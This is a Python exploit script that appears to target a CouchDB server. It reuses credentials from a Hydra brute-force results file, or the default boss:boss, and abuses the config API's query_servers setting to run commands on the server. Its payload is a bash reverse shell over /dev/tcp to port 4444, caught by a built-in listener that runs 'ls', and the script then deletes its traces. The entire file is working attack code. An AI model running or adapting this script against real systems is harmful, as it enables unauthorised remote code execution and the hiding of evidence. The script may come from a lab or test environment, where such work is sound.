import os
import socket
import sys
import json
from threading import Thread
import requests

host = sys.argv[1]


def read_all(conn):
    line = ""
    while True:
        line += conn.recv(1024).decode()
        if line.strip().endswith("#"):
            break
    return line


def open_reverse_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', 4444))
        s.listen(1)
        print("Waiting for connection")
        conn, _ = s.accept()
        print("Got connection")
        print(read_all(conn))
        conn.send(b"ls\n")
        results = read_all(conn)
        print(results)
        conn.send(b"exit\n")
        conn.shutdown(0)


def get_url():
    if os.path.exists("/app/hydra.json"):
        result = json.load(open("/app/hydra.json"))['results'][0]
        user = result['login']
        return "http://%s:%s@%s" % (user, result['password'], host)
    else:
        return "http://%s:%s@%s" % ("boss", "boss", host)


if __name__ == '__main__':
    url = get_url()
    # Create DB
    x = requests.put(f"{url}/god")
    requests.put(f"{url}/god/zero", data='{"body": "test"}')

    # Create commands for reverse shell
    local_ip = socket.gethostbyname(socket.gethostname())
    requests.put(f"{url}/_node/nonode@nohost/_config/query_servers/cmd_create",
                 data='"echo -e \'bash -i >& /dev/tcp/%s/4444 0>&1\' > run.sh"' % local_ip)

    requests.put(f"{url}/_node/nonode@nohost/_config/query_servers/cmd_exec", data='"bash run.sh"')

    Thread(target=open_reverse_listener).start()

    # execute the reverse shell
    requests.put(f'{url}/god/_design/zero',
                 data='{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd_create"}')
    try:
        requests.put(f"{url}/god/_design/zero2",
                     data='{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd_exec"}', timeout=1)
    except requests.exceptions.ReadTimeout:
        print("Reverse shell executed")


    # Cleanup
    requests.delete(f"{url}/god/_design/zero")
    requests.delete(f"{url}/god/_design/zero2")

    requests.delete(f"{url}/_node/nonode@nohost/_config/query_servers/cmd_create")
    requests.delete(f"{url}/_node/nonode@nohost/_config/query_servers/cmd_exec")

    requests.delete(f"{url}/god")
    print("Cleaned up")

